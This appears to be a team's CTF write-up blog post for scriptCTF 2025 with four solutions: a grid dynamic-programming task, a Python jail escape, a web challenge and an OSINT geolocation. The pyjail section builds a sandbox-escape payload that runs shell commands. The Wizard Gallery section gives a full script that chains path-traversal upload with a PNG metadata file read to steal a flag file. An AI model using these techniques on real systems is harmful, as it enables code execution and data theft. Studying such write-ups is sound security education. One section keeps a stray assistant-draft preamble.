---
title: "scriptCTF 2025"
date: 2025-08-22T00:00:00+00:00
# weight: 1
# aliases: ["/first"]
tags: ["scriptctf", "ctf", "web", "programming", "pyjail", "osint"]
author: ["Ale18V", "AlBovo", "katchup"] # multiple authors
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "All the writeups of the scriptCTF 2025"
canonicalURL: "https://albovo.github.io/en/ctf/"
disableHLJS: false # to enable highlightjs
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
math: true
cover:
    image: "https://opengraph.githubassets.com/eccdc445364e4f9dcbece7bb7f178f0756be13a48717c78ec94bf78c35861b9a/AlBovo/CTF-Writeups" # image path/url
    alt: "scriptCTF 2025" # alt text
    caption: "All the writeups of the scriptCTF 2025." # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
editPost:
    URL: "https://github.com/AlBovo/AlBovo.github.io/blob/main/content/en"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

# scriptCTF 2025 🚩
![scriptctf logo](/images/scriptctf.png)

## Back From Where 💻

### Problem Statement

The problem can be stated as follows:

*You are given an \(N \times N\) grid of integers \(a_{ij}\). A path is considered valid if it starts top-left and only moves down or right. For each cell \((i,j)\) find the maximum number of trailing zeros in the product of values along any valid path.*


### Writeup 📜

#### Number of trailing zero's

The first question is how to practically calculate the number of trailing zero's of a number $m$. The answer is pretty straightforward: we find how many times $m$ is divisible by $5$ and by $2$ the number of trailing zero's is how many five's and two's can be matched together. Suppose $m$ is divisible by five $f$ times and by two $t$ times, then the number of trailing zero's is \(min(f, t)\).

#### First attempt

My guess for solving this problem was using a _dynamic programming_ approach.

The first idea that came to mind was to store for every cell a pair `<f, t>` where `f` is the number of **f**ives accumulated until that cell and `t` is the number of **t**wos. At every cell we would just explore the neighbors and check which choice provides the biggest number of trailing zero's. The idea was clearly nonsensical as we can't maximize for both at the same time. But this led me to an important insight. 

#### A better idea

_What if I instead fix one of the two and maximize for the other one_? This is indeed possible.

Let `dp[i][j][f]` be the maximum number of two's we can accumulate on any path from the top-left cell to cell $(i,j)$ with at least $f$ fives.

Let the value $a_{ij}$ of cell $(i, j)$ contain $5^{F}$ and $2^{T}$ in its prime factorization.

Then:
```cpp
dp[i][j][f] = max(dp[i-1][j][max(f - F, 0)], dp[i][j-1][max(f - F, 0)]) + T

```

This generally works but we have to handle the first column and first row differently to avoid indexes out of bounds so:

```cpp
dp[0][j][f] = dp[0][j-1][max(f-F, 0)] + T (with j > 0)
dp[i][0][f] = dp[i-1][0][max(f-F, 0)] + T (with i > 0)
```

And the initalization of the cell $(0, 0)$ is performed as follows:

```cpp
// number of [fives, twos] in the prime factorization of cell (0,0)
auto [c, d] = divs[g[0][0]];
for (int q = 0; q <= c; q++)
	 // it's possible to get here with `q` fives
	 dp[q][0][0] = d;

```

The solution for cell $(i, j)$ can be computed while calculating `dp`:

```cpp
for(int q = 0; q < B; q++) {
	...
	n_trailing_zeroes = min(q, dp[q][i][j]);
	ans[i][j] = max(ans[i][j], n_trailing_zeroes);
	...
}
```

#### Solution correctness

How are we taking into account the possibility that no path exists such that we get to cell $(i, j)$ with $f$ fives? The `dp` array is initialized to negative infinity. When we run our dynamic programming on the array only paths with a legal number of fives will propagate.

As a concrete example, suppose $a_{00} = 5$ and $a_{01} = 4$. Then according to the above initialization:

```cpp
dp[0][0][0] = 1
dp[0][0][1] = 1
```

The rest will be:

```cpp
dp[0][0][2] = -INF
... = -INF
```

So if we explore cell $(0, 1)$ assuming `f = 2` then:

```cpp
dp[0][1][0] = dp[0][0][max(2-0, 0)] + 2 = dp[0][0][2] + 2 = -INF + 2 = -INF
```

##### Time complexity

Finally, is the time complexity of the algorithm feasible?
Let's call $B$ the bound on the number of fives on any given path. We know that it makes no sense to calculate `dp[i][j][f]` with `f > B` because no path can have more than $B$ fives. The complexity of the algorithm would be $O(B\times N^{2})$.
Let $A$ be the bound on the values contained in the cells, then it follows that no cell value $a_{ij}$ can contain more than $log_{5}(A)$ fives in its prime factorization.
The longest valid path on the grid is of length $2N$ thus the bound on the total number of fives in the prime factorization of the product of any path is $2N\log{5}A$.
If we take a look at the server code that generates the grid:

```py
n = 100

grid_lines = []
for _ in range(n):
    row = []
    for _ in range(n):
        flip = random.randint(1, 2)
        if flip == 1:
            row.append(str(random.randint(1, 696) * 2))
        else:
            row.append(str(random.randint(1, 696) * 5))
    grid_lines.append(' '.join(row))
```
We see that `A = max(696 * 2, 696 * 5) = 3480` which we round up to 5000. Given that $\log_{5}(5000) = \log_{5}(A) \approx 5.3$, no more than $5$ fives per cell can be added. 
The complexity is then $O(2N^{3}\log_{5}(A))$. Plugging in the constraints regarding $A$ and $N$ this practically means about $100^3 * 10 = 10^7$ operations which is fast.

### Full solution

```cpp
#include <bits/stdc++.h>
using namespace std;
constexpr int N = 100;
constexpr int MAXV = 5000;
constexpr int B = 10*N;
#define INF (1e9)
constexpr array<pair<int, int>, MAXV> divs = []() consteval {
    array<pair<int, int>, MAXV> res;
    for (int i = 1; i < MAXV; i++) {
        res[i] = {0, 0};
        int j = i;
        while (j % 2 == 0) {
            res[i].second++;
            j = j >> 1;
        }

        while (j % 5 == 0) {
            res[i].first++;
            j = j/5;
        }
    }
    return res;
}();

int main() {
    vector<vector<int>> g(N, vector<int>(N, 0));

    for (auto &row : g) {
        for (auto &e : row) {
            cin >> e;
        }
    }
    vector<vector<int>> ans(N, vector<int>(N, 0));
    vector<vector<vector<int>>> dp(B, vector<vector<int>>(N, vector<int>(N, -INF)));
    auto [c, d] = divs[g[0][0]];
    ans[0][0] = min(c, d);
    for (int q = 0; q <= c; q++) {
        dp[q][0][0] = d;
    }

    for (int q = 0; q < B; q++) {
        for (int i = 1; i < N; i++) {
            auto [c, d] = divs[g[i][0]];
            dp[q][i][0] = dp[max(q - c, 0)][i - 1][0] + d;
            ans[i][0] = max(ans[i][0], min(q, dp[q][i][0]));
        }

        for (int j = 1; j < N; j++) {
            auto [c, d] = divs[g[0][j]];
            dp[q][0][j] = dp[max(q - c, 0)][0][j - 1] + d;
            ans[0][j] = max(ans[0][j], min(q, dp[q][0][j]));
        }

        for (int i = 1; i < N; i++) {
            for (int j = 1; j < N; j++) {
                auto [c, d] = divs[g[i][j]];
                dp[q][i][j] = max(dp[max(q - c, 0)][i - 1][j], dp[max(q - c, 0)][i][j - 1]) + d;
                ans[i][j] = max(ans[i][j], min(q, dp[q][i][j]));
            }
        }
    }

    for (auto &row : ans) {
        for (auto &v : row) {
            cout << v << " ";
        }
        cout << endl;
    }
}
```

## Modulo 🐍

Here’s a polished write-up draft you can adapt for your team’s blog or the CTF submission. I kept it engaging but technical, and highlighted the progression of reasoning (including the "false trails" we went through) because that’s often what organizers appreciate most.

### Challenge Recap

We were given the following Python jail:

```python
import ast
print("Welcome to the jail! You're never gonna escape!")
payload = input("Enter payload: ") # No uppercase needed
blacklist = list("abdefghijklmnopqrstuvwxyz1234567890\\;._")
for i in payload:
    assert ord(i) >= 32
    assert ord(i) <= 127
    assert (payload.count('>') + payload.count('<')) <= 1
    assert payload.count('=') <= 1
    assert i not in blacklist

tree = ast.parse(payload)
for node in ast.walk(tree):
    if isinstance(node, ast.BinOp):
        if not isinstance(node.op, ast.Mod):
            raise ValueError("I don't like math :(")
exec(payload,{'__builtins__':{},'c':getattr})
print('Bye!')
```

**Restrictions:**

* All lowercase letters are blacklisted except `c`.
* No digits, no **underscores**, no **dots**, no backslashes.
* At most one `<` and one `=` in the entire payload.
* The only allowed binary operator is `%`.
* Execution context has no builtins, only `c = getattr`.

### First impression

The first thing that I immediately noticed was that there was no hint of any flag in the challenge code.
The goal was clearly to get a RCE.

The usual procedure to deal with pyjails is the following:

1. Use `object.__subclasses__()` to get a hold of dangerous classes.
2. Find one whose `__init__.__globals__` contained `__builtins__`.
3. From there, call `__import__('os').system('cat flag')`.

The `.` character was blacklisted but we had access to `getattribute` using the `c` character.
The real problems were that the underscore character was blacklisted and the builtins were empty.

### Another key variable

There is another important variable similar to the builtins which is `__globals__`.

`__globals__` is attached to every Python function object and is the actual dictionary used as the global namespace when the function runs.

Accessing it bypasses the fact that exec was given `__builtins__ = {}`. We don’t care about that anymore if we can find a function from a module whose globals already contain powerful references.

Enter the hero: `importlib._bootstrap.ModuleSpec`.

Its `__globals__` include `sys`, and from that, one can reach `sys.modules['posix']` and its `system` function to execute shell commands.

This avoids touching builtins entirely

### Bypass the filters

#### **Forge integers without digits**:

We can get `False` with the expression `[] < []`. Since we are allowed to use one `=` character we can assign that to a variable: `X := []<[]`.

Remember that only binary operators are blocked but we can get any number from `X` using only unary operators:
- We can flip sign of any number and decrease by one using the `~` operator (eg `~0` = `-1`)
- Flip sign using the `-` operator.
Even if `X` is actually `False` and not `0`, the value is interpreted as integer using those operators.
For example to get `3` we can use `-~(-~(-~X))`.

This is the primitive that we defined to generate numbers:
```python
def define_zero() -> str:
    # exactly one '=' and one '<' in the whole payload
    return "(X:=[]<[])"


@lru_cache(maxsize=None)
def n_expr(n: int) -> str:
    """
    Build an integer expression using only:
      - X (assumed 0)
      - unary operators ~ and -~
    No digits in source.
    """
    if n == 0:
        return "X"
    if n == -1:
        return "~X"
    return "(" + "-~" * n + "X" + ")"

```

#### **Conjure strings without letters**:

It is not very known but the `%` binary operator can be used to format strings if applied on a string, similar to how the C function `printf` works.
The `%c` format specifier is notable because it formats a character from a codepoint, aka ascii encoding for the sake of this writeup. For example, the underscore's codepoint is 95, thus `"%c" % 95 = "_"`.
So right now we can craft any number and any string.

This is the primitive that we used for crafting arbitrary strings:
```python
def str_expr(s: str) -> str:
    """
    Build a string literal via "%c"*k % (codepoints...),
    where each codepoint is built via n_expr.
    Only % as BinOp; no forbidden letters in source.
    """
    parts = [n_expr(ord(ch)) for ch in s]
    return '"' + ("%c" * len(parts)) + '"%(' + ",".join(parts) + ")"
```

### Exploit

The exploit consists of two parts:
1. Accessing ModuleSpec (Probe)
2. RCE (Exec)

#### Probing

All classes in Python are subclasses of `object` and every class has an attribute called `__subclasses__`. So we can get to `ModuleSpec` from there. The question is how to get to `object`.

Here `__mro__` comes into play. Every class in Python has a `__mro__` attribute, the *method resolution order*. It is a tuple of classes Python will search when looking up attributes. For example, using `c` aka `getattr`:

```python
>>> getattr.__class__
<class 'builtin_function_or_method'>
>>> getattr.__class__.__mro__
(<class 'builtin_function_or_method'>, <class 'object'>)
```

So `getattr.__class__.__mro__[-1]` gives us `object`, and then `object.__subclasses__()` gives us the full list of subclasses, including `ModuleSpec`.

There is still an obstacle however:
```
>>> len(getattr.__class__.__mro__[-1].__subclasses__())
286
```
How do we know where `ModuleSpec` lies? We don't have access to the `print` function so we can't just print each one of them. When testing locally we had success with the following approach:
```python
def probe_payload(i: int) -> str:
    """
    Raises KeyError with the name of object.__subclasses__()[i],
    leaking the class name via traceback.
    """
    NAME = str_expr("__name__")
    subs = subclasses_list_expr()
    idx  = n_expr(i)
    return f"({define_zero()},{{}}[c({subs}[{idx}],{NAME})])"
```
The idea is to get `subclasses()[i]` and to access an empty dict using that as a key. That will trow a key error and will leak the name of the class. That testing locally, using `pwntools`'s process utility.
However when trying remotely we didn't see anything because `stderr` was missing.
We remembered about the dockerfile, built the image and tested the `probe` on that container, where we could see the stderr logs. The logic was that the image was the same so the index of `ModuleSpec` would not change.

We probed the indices between `0` and `200` and found `ModuleSpec` around index `100`.

#### RCE

Now that we have access to `ModuleSpec` we can access the `__globals__` and `sys` and execute arbitrary shell commands:
```python
def exec_payload(idx: int, cmd: str) -> str:
    """
    Execute via: ModuleSpec.__init__.__globals__['sys'].modules['posix'].system(cmd)
    """
    subs = subclasses_list_expr()
    INIT = str_expr("__init__")
    GLOB = str_expr("__globals__")
    SYS  = str_expr("sys")
    MODS = str_expr("modules")
    POSX = str_expr("posix")
    SYSF = str_expr("system")
    CMD  = str_expr(cmd)
    IDX  = n_expr(idx)

    sys = f"(c(c({subs}[{IDX}],{INIT}),{GLOB})[{SYS}])"
    posix = f"(c({sys},{MODS})[{POSX}])"
    return (
        f"({define_zero()},c({posix},{SYSF})({CMD}))"
    )
```

After some exploring with `ls` we found a file called `flag.txt` and we leaked it using a simple `cat`.


## Wizard Gallery 🌐

When we launch the service we notice an image upload that trusts the **client-supplied filename** and a separate route that serves a **small "logo" thumbnail**. That’s enough of a foothold to try two classic tricks: path traversal on the upload, and metadata shenanigans on the thumbnailer.

### Exploit path

So, in order to explain the exploit we need to analyze the source code, there we found a few things that have been useful while pwning the service.

* The uploader accepts arbitrary filenames; `../logo.png` lands **outside** the intended folder, letting us overwrite the site’s main `logo.png`.
* The thumbnailer that serves `logo-sm.png` **reads PNG metadata** (a `tEXt` key named `profile`) and appears to **dereference it as a local path** while generating the small logo.

```python
@app.route('/uploads/<filename>')
def uploaded_file(filename):
   # Make sure to handle the case where the file is logo-sm.png (not part of the vault)
   if filename == 'logo-sm.png':
      return "File not found", 404
   return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

# Serve all files from public to /
@app.route('/<path:filename>')
def serve_files(filename):
   try:
      return send_from_directory(PUBLIC_DIR, filename)
   except:
      return "File not found", 404
```

Once we fully understood where the vulnerabilities relied we had only to actually write a python script that had to:

```python
@app.route('/logo-sm.png')
def logo_small():
   # A smaller images looks better on mobile so I just resize it and serve that
   logo_sm_path = os.path.join(app.config['UPLOAD_FOLDER'], 'logo-sm.png')
   if not os.path.exists(logo_sm_path):
      os.system("magick/bin/convert logo.png -resize 10% " + os.path.join(app.config['UPLOAD_FOLDER'], 'logo-sm.png'))
    
   return send_from_directory(app.config['UPLOAD_FOLDER'], 'logo-sm.png')
```

1. **Craft a PNG** with a `tEXt` chunk: `profile=/home/chall/flag.txt`.
   (Any tiny valid PNG works; the key is the `profile` text chunk.)
2. **Overwrite the real logo** by uploading that PNG but naming it `../logo.png` in the form field.
   (This abuses path traversal to replace the file the site later thumbnails.)
3. **Trigger processing** by requesting the small logo (e.g., `/logo-sm.png`).
   The image pipeline reads the `profile` value and **embeds the file’s bytes** into the output image stream.
4. **Exfiltrate** by downloading the returned PNG and scraping long hex runs from the byte stream; concatenate, hex-decode, and you recover the secret.
5. **Flag** is exactly the contents of `flag.txt` produced by step 4 (printed by the helper script).

### One-liner test

It's also possible to write 

* **Upload (traversal):** `filename=../logo.png` with your crafted PNG as the body.
* **Fetch:** `GET /logo-sm.png` -> save response -> regex out `[a-f0-9]{5,}`, join, `bytes.fromhex(...).decode()`.

### Automation

Running `python3 solve.py <HOST> <PORT>` performs all steps: builds the malicious PNG with the `profile` chunk, overwrites `logo.png`, fetches `logo-sm.png`, strips hex sequences from the response, decodes, and **prints the flag**. (Artifacts: `final_exploit.png` and `final_output.png` for inspection.)

**Final submission:** the exact string output from the decode step (contents of `flag.txt`).

**P.S.**: To find the actual path of the flag we made the server crash in order to get the Flask Debug page (`debug=True`).

### Exploit

```python
#!/usr/bin/env python3
import requests
from PIL import Image, PngImagePlugin
import os
import time
import re
import sys

MALICIOUS_PNG_PATH = "final_exploit.png"
OUTPUT_PNG_PATH = "final_output.png"

def create_png(file_to_read):
    img = Image.new("RGB", (10, 10), color="black")
    info = PngImagePlugin.PngInfo()
    info.add_text("profile", file_to_read)
    img.save(MALICIOUS_PNG_PATH, "PNG", pnginfo=info)


def reset_server_cache(upload_url):
    with open("reset_file", "w") as f:
        f.write("reset")
    files = {"file": ("reset", open("reset_file", "rb"), "application/octet-stream")}
    requests.post(upload_url, files=files, timeout=10)
    os.remove("reset_file")
    time.sleep(1)


def main():
    base_url = f"http://{sys.argv[1]}:{sys.argv[2]}" # python solve.py host port
    upload_url = f"{base_url}/upload"
    logo_sm_url = f"{base_url}/logo-sm.png"

    reset_server_cache(upload_url)
    create_png("/home/chall/flag.txt")

    files = {"file": ("../logo.png", open(MALICIOUS_PNG_PATH, "rb"), "image/png")}
    requests.post(upload_url, files=files, timeout=15).raise_for_status()
    requests.get(logo_sm_url, timeout=10)
    time.sleep(2)

    response = requests.get(logo_sm_url, timeout=15)
    response.raise_for_status()
    with open(OUTPUT_PNG_PATH, "wb") as f:
        f.write(response.content)

    flag_dec = ''
    for flag in re.findall(r'[a-f0-9]+'.encode(), response.content):
        if len(flag) > 4:
            flag_dec += flag.decode()
    print(bytes.fromhex(flag_dec).decode().strip())

if __name__ == "__main__":
    main()
```

## Insider 4 🔎

### Introduction

When we open the `.insider-4` [folder](https://github.com/scriptCTF/scriptCTF26/tree/main/OSINT/.insider-4/attachments), we see `fireworks.jpg`, `room.jpg`, and a `.secret` file note mentioning that the photographer adds comments to their pictures. That points us straight to hidden
metadata.

### Analysis

Using **exiftool** on the images, we find in `fireworks.jpg` a comment about the _Wendell family_ organizing fireworks. [A quick search](https://wendellfamilyfireworks.com/places-to-eat-stay-watch/) shows the Wendell family holds annual fireworks in Rockport, Texas. That narrows
the vacation location down to the Rockport area.

Next, we check the second image, `room.jpg`. Itʼs clearly a photo taken from a hotel room balcony with a
direct seaside view. Knowing the fireworks happen at Rockport, we pull up Google Maps, type in "hotels"
along the waterfront, and start matching the balconies and overall structure. After some back and forth with Street View, the match is obvious: **Days Inn by Wyndham Rockport, 901 Hwy 35 N, Rockport, TX 78382** ([`https://maps.app.goo.gl/sSV1KWFeVUWauTWZ9`](https://maps.app.goo.gl/sSV1KWFeVUWauTWZ9)).

Now weʼre left with figuring out the actual room number. Since the challenge hinted we wouldnʼt need to
brute force endlessly, we thought of checking **Google Maps reviews and guest photos**, as people love
posting pictures of their rooms. Sure enough, scrolling through the photos, we stumble across an image
containing room numbers **115** and **116** right next to each other. We observed that the room numbers
descend as we go toward the part of the building matching our balcony view in `room.jpg`. That means our
target room should be a bit lower than 115.

We test a small range: 114, 113, 112, 111, etc. And room **111** hits.

The flag requires address plus room number, formatted like the example. The hotelʼs street address is `901 Hwy 35 N`, so the final submission looks like this:

```
scriptCTF{901_Hwy_35_N_111}
```